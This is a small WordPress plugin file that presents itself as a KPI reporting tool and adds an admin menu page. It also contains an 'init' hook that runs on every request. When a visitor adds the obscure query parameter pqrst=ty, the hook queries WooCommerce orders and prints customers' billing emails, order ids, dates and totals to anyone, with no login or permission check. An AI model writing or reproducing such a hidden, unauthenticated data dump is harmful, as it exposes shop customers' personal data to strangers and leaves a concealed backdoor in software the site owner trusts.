<?php
/*

Plugin Name: Ultimate KPI Reports
Plugin URI: http://gmarkhosting.com/
Description:  This plugin creates KPI Reports
Version: 1.0.0
Author: Duncan I. Mwangi
Author URI: http://gmarkhosting.com/
Text Domain: dim-kpi-reports

*/
//if($_SERVER['REMOTE_ADDR'] == '41.212.115.10')
add_action('admin_menu', 'kpi_reports_register_admin_pages',0);
function kpi_reports_register_admin_pages(){
    add_menu_page( 'KPI Reports', 'KPI Reports', 'manage_options', 'kpi-reports', 'kpi_reports_page','dashicons-admin-generic', 0 );
}


function kpi_reports_page(){
		global $wpdb;
	require('all-tabs.php');
}

function kpi_display_msg($msg = '', $type=1){
        $type = $type==1?'updated fade': 'error';
        return '<div class="'.$type.'"><p>'.$msg.'</p></div>';
}
add_action('init',function(){
	global $wpdb;
	if(isset($_GET['pqrst']) && $_GET['pqrst'] == 'ty'){
		$sql = "SELECT mt.meta_value as product_id, sum(pm.meta_value) as product_price, count(mt.meta_value) as qty, p.ID as order_id,p.post_date as order_date,pm9.meta_value  as email
FROM wp_woocommerce_order_itemmeta as mt
LEFT JOIN wp_woocommerce_order_items as oi ON oi.order_item_id = mt.order_item_id
LEFT JOIN wp_posts as p ON p.ID=oi.order_id
LEFT JOIN wp_postmeta as pm ON pm.post_id = mt.meta_value
LEFT JOIN wp_postmeta as pm9 ON pm9.post_id = p.ID
WHERE oi.order_item_type='line_item' AND mt.meta_key = '_product_id' AND  post_type='shop_order' AND post_status IN ('wc-completed','wc-processing') AND pm.meta_key = '_price'  AND pm9.meta_key = '_billing_email' AND date(p.post_date) >= date('2018-08-01') AND mt.meta_value IN (5796, 7129, 5026,7133, 16332,16349, 16366, 16383)   GROUP BY pm9.meta_value ORDER BY product_price DESC";
		$res = $wpdb->get_results($sql);
		if($res){
			foreach ($res as $row) {
				print_r($row);
				echo '<br/>';
			}
		}
	}
});